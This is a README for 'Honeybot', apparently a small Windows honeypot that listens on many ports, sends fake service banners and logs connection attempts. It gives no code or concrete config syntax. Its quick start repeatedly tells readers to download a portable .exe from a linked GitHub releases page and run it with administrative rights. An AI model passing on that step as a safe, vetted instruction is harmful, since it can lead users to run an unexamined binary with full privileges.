Honeybot is a light, Windows port-based honeypot that can listen on many TCP and UDP ports simultaneously. It is designed to be small, fast, and easy to run, making it handy for quick deployments and testing across multiple ports in a single instance. This README documents what Honeybot is, how it works, how to get started, and how to tailor it to fit your environment. It covers setup, configuration, usage, and maintenance in a clear, practical way.

üïµÔ∏è‚Äç‚ôÇÔ∏è Honeybot acts as a low-profile listener on chosen ports, often used in defense research, traffic analysis, and early-stage deception experiments. It is built to be lightweight on system resources while still delivering meaningful insights from connection attempts, banners, and basic interactions across defined ports. The goal is to provide a simple, reliable surface that helps you observe attacker behavior without introducing heavy software or complex configurations.

Overview
Honeybot is a portable, Windows-friendly honeypot designed to listen on dozens of ports at once. It focuses on practicality: you can spin it up on a Windows machine, point it at a handful of commonly probed ports, and begin collecting connection attempts, timing data, and basic service banners. It is intentionally straightforward so you can reason about what it does, why it exists, and how it behaves in your network.

Why Honeybot
- Simplicity: Start quickly without a heavy configuration burden.
- Port coverage: Listen on multiple TCP and UDP ports at the same time.
- Lightweight: Low CPU and memory footprint to fit on modest host systems.
- Observability: Logs, banners, and connection metadata that help you understand probe traffic.
- Extensible: Designed to accommodate simple plugins and configuration-driven behavior.
- Windows-first: Built for Windows environments where port listening and logging are common needs.

Core features
- Multi-port listening: Open many TCP and UDP ports in parallel.
- Banner and response handling: Optional banners and minimal responses to mimic common services.
- Connection logging: Capture essential details like timestamp, source IP, port, protocol, and outcome.
- Simple configuration: Define ports, protocols, and banners in a readable format.
- Lightweight footprint: Small binary and modest system resource use.
- Easy deployment: Minimal prerequisites, straightforward run process.

How it works
- Honeybot runs as a Windows console application.
- It reads a configuration that lists ports and protocols to listen on.
- For each port, it opens a listener socket and waits for incoming connections.
- When a client connects, Honeybot records the attempt, optionally sends a banner, and closes or maintains the connection according to the configuration.
- All events are emitted to a local log directory in a consistent format for analysis.
- The design emphasizes predictability and safety in a testing or research context.

Architecture and design
- Core loop: A simple event-driven loop handles new connections and timing events.
- Port listeners: Separate listeners for each configured port and protocol ensure isolation and clarity.
- Banner layer: A small, pluggable banner engine can respond with basic service identifiers to entice further probing.
- Logger: A minimal, structured logger writes events in a JSON-like format for easy parsing.
- Config layer: The configuration defines ports, protocols, host binding, log paths, and banner behavior.
- Extensibility hooks: Lightweight placeholders exist for future plugin support and richer interaction.

Getting started
If you want to explore Honeybot, you should start by grabbing the Windows port binary from the Releases page and running it on a supported Windows machine. The Windows port binary is packaged to be straightforward to deploy on standard Windows environments.

- Download and run the Windows port binary named Honeybot-Windows-Port-Portable.exe from the Releases page.
- Run the binary from an elevated command prompt if required by your environment.
- Observe the console output and the log directory you configure.

Tip: The Releases page hosts binaries for several platforms. The Windows port is designed to work out of the box in typical Windows setups.

Quick start guide
- Step 1: Obtain the Windows port binary
  - Go to the Releases page and download the Windows port executable: Honeybot-Windows-Port-Portable.exe. The file name may vary by version, but look for a Windows port or portable exe.
  - The Releases page is accessible here: https://github.com/adamthapa21/Honeybot/releases
- Step 2: Prepare the environment
  - Create a local folder to store logs and any output Honeybot produces.
  - Ensure you have the necessary privileges to bind to the chosen ports (some ports require elevated privileges).
- Step 3: Run Honeybot
  - Open a command prompt with administrative rights.
  - Run the executable with your preferred configuration options if any, or rely on the default settings for initial testing.
- Step 4: Validate operation
  - Check the log directory for event entries.
  - Confirm that the listening ports are shown as bound and are accepting connections as expected.
- Step 5: Iterate
  - Adjust the port list, banners, and logging level as needed.
  - Re-run Honeybot to apply changes and observe how traffic changes with your adjustments.

Note: For the first run, you can keep the defaults. You can always tailor the behavior later with a configuration file.

Configuration and tuning
Honeybot uses a simple, human-friendly configuration approach to make it easy to tailor behavior to your network and research goals. The configuration covers port lists, protocols, host binding, and logging preferences, along with optional banners for common services to mimic.

Key configuration ideas
- Port ranges: Define a list of ports to listen on for both TCP and UDP.
- Host binding: Bind to all interfaces (0.0.0.0) or a specific interface to limit exposure.
- Banner profiles: Configure banners to resemble common services (SSH, FTP, HTTP, etc.).
- Logging: Decide where to store logs, how verbose to be, and the format of log entries.
- Output formats: Keep logs in a simple, structured format (JSON-like lines) for easy parsing.

Sample configuration ideas (conceptual, not a strict syntax)
- Listening ports
  - TCP: 22, 23, 80, 443
  - UDP: 53, 123
- Host binding
  - 0.0.0.0
- Banner profiles
  - SSH: "SSH-2.0 Honeybot"
  - HTTP: "HTTP/1.1 200 OK"
- Logging
  - Directory: "logs"
  - Level: "info" or "debug"
  - Format: "json"

If a configuration file exists, you can edit it with any plain text editor. The exact syntax will be documented in the project files, with example snippets to guide you. The goal is to make it intuitive to tweak port coverage, interaction behavior, and data capture without needing to recompile or rebuild.

Monitoring, logs, and data
- Logs: Honeybot writes events to a local log directory. Each event includes a timestamp, source address, port, protocol, and a basic outcome. The logs are designed to be easy to parse, enabling quick ingestion into analysis pipelines or SIEMs.
- Banners and interactions: If you enable banners, you‚Äôll see simple textual banners that imitate real services. This can help you study attacker responses and timing characteristics.
- Timestamps: Times are recorded with millisecond precision to help you correlate events with external network activity.
- Outputs: In addition to log files, Honeybot can print essential status information to the console, which is useful for live monitoring during experiments.

Performance and footprint
- Resource usage: Honeybot is designed to be lightweight. It aims to use a small fraction of CPU cycles and a few megabytes of memory in typical runs.
- Startup: It starts quickly, with port listeners ready for incoming connections in a short time window.
- Stability: The code paths are straightforward, focusing on predictable behavior and clean shutdowns.
- Scalability: While designed to be lean, the architecture supports adding additional ports and handling through a clear, modular approach.
